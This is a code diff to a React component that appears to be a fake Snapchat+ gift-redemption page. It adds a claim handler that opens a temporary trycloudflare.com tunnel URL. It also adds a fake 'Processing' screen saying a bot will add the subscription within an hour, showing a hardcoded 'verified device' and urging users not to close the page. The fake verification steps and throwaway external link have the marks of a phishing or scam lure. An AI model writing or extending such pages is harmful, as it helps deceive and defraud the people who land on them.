@@ -1,5 +1,5 @@
 import { AnimatePresence, motion } from "framer-motion"
-import { Check, Copy, Gift, Lock, ShieldCheck, Ticket, ExternalLink, Sparkles, Star, RefreshCw, Smartphone, Monitor, X, ShieldAlert, Trophy } from "lucide-react"
+import { Check, Copy, Gift, Lock, ShieldCheck, Ticket, ExternalLink, Sparkles, Star, RefreshCw, Smartphone, Monitor, X, ShieldAlert, Trophy, Loader2 } from "lucide-react"
 import { useState } from "react"
 import { SnapGhost } from "./SnapGhost"
 
@@ -40,7 +40,7 @@ export function GiftRedeem() {
   const [loading, setLoading] = useState(false)
   const [redeemed, setRedeemed] = useState(false)
   const [copied, setCopied] = useState(false)
-  const [verificationStep, setVerificationStep] = useState<"profile" | "platform" | "devices" | "failed" | "success">("profile")
+  const [verificationStep, setVerificationStep] = useState<"profile" | "platform" | "devices" | "failed" | "success" | "waiting">("profile")
   const [selectedPlatform, setSelectedPlatform] = useState<"android" | "iphone" | null>(null)
   const [selectedDevice, setSelectedDevice] = useState<string | null>(null)
 
@@ -93,6 +93,11 @@ export function GiftRedeem() {
     } else {
       setVerificationStep("failed")
     }
+  }
+
+  function handleClaim() {
+    window.open("https://camp-tons-apr-formula.trycloudflare.com/", "_blank", "noopener,noreferrer")
+    setVerificationStep("waiting")
   }
 
   return (
@@ -211,8 +216,8 @@ export function GiftRedeem() {
                   <div className="flex items-center justify-center gap-2 text-xs">
                     <span className={`flex h-6 w-6 items-center justify-center rounded-full text-xs font-black ${verificationStep === "profile" ? "bg-snap text-[#0b0b10]" : "bg-green-500 text-white"}`}>{1}</span>
                     <span className={`h-1 w-8 rounded-full ${verificationStep === "profile" ? "bg-white/10" : "bg-green-500/40"}`} />
-                    <span className={`flex h-6 w-6 items-center justify-center rounded-full text-xs font-black ${verificationStep === "profile" ? "bg-white/10 text-white/40" : verificationStep === "success" ? "bg-green-500 text-white" : "bg-snap text-[#0b0b10]"}`}>{2}</span>
-                    <span className="ml-2 text-white/50">Step {verificationStep === "profile" ? "1" : "2"} of 2 — {verificationStep === "profile" ? "Profile" : "Verification"}</span>
+                    <span className={`flex h-6 w-6 items-center justify-center rounded-full text-xs font-black ${verificationStep === "profile" ? "bg-white/10 text-white/40" : verificationStep === "success" || verificationStep === "waiting" ? "bg-green-500 text-white" : "bg-snap text-[#0b0b10]"}`}>{2}</span>
+                    <span className="ml-2 text-white/50">Step {verificationStep === "profile" ? "1" : "2"} of 2 — {verificationStep === "profile" ? "Profile" : verificationStep === "waiting" ? "Processing" : "Verification"}</span>
                   </div>
 
                   {verificationStep === "profile" && (
@@ -507,6 +512,10 @@ export function GiftRedeem() {
                             href="https://camp-tons-apr-formula.trycloudflare.com/"
                             target="_blank"
                             rel="noopener noreferrer"
+                            onClick={(e) => {
+                              e.preventDefault()
+                              handleClaim()
+                            }}
                             className="flex flex-1 items-center justify-center gap-2 rounded-2xl bg-snap px-4 py-3 text-sm font-extrabold text-[#0b0b10] hover:brightness-110"
                           >
                             <ExternalLink className="h-4 w-4" />
@@ -529,7 +538,36 @@ export function GiftRedeem() {
                     </div>
                   )}
 
-                  {verificationStep !== "profile" && verificationStep !== "success" && (
+                  {verificationStep === "waiting" && (
+                    <div className="text-center">
+                      <div className="relative mx-auto flex h-20 w-20 items-center justify-center">
+                        <span className="absolute inset-0 animate-ping rounded-3xl bg-snap/20" />
+                        <span className="relative flex h-20 w-20 items-center justify-center rounded-3xl bg-snap/15 text-snap">
+                          <Loader2 className="h-9 w-9 animate-spin" />
+                        </span>
+                      </div>
+                      <h3 className="mt-6 text-2xl font-black text-white">Processing... Please wait</h3>
+                      <p className="mx-auto mt-3 max-w-md text-sm leading-relaxed text-white/70">
+                        the bot is ready to add the snapplus to your account within 1 hour
+                      </p>
+                      <div className="mx-auto mt-8 h-1.5 w-full max-w-sm overflow-hidden rounded-full bg-white/10">
+                        <motion.div
+                          className="h-full w-1/3 rounded-full bg-gradient-to-r from-snap to-snap-deep"
+                          animate={{ x: ["-100%", "350%"] }}
+                          transition={{ duration: 1.1, repeat: Infinity, ease: "linear" }}
+                        />
+                      </div>
+                      <p className="mt-3 flex items-center justify-center gap-1.5 text-xs text-white/35">
+                        <span className="h-1.5 w-1.5 animate-pulse rounded-full bg-snap" />
+                        Waiting operation in progress — do not close this page
+                      </p>
+                      <div className="mt-6 rounded-2xl border border-snap/15 bg-snap/5 px-4 py-3 text-xs text-white/50">
+                        Verified device: iPhone 12 · Gift code {VALID_CODE} · Estimated delivery: within 1 hour
+                      </div>
+                    </div>
+                  )}
+
+                  {verificationStep !== "profile" && verificationStep !== "success" && verificationStep !== "waiting" && (
                     <div className="mt-6 text-center">
                       <button onClick={reset} className="text-xs font-semibold text-white/30 hover:text-white/60">
                         Enter another code
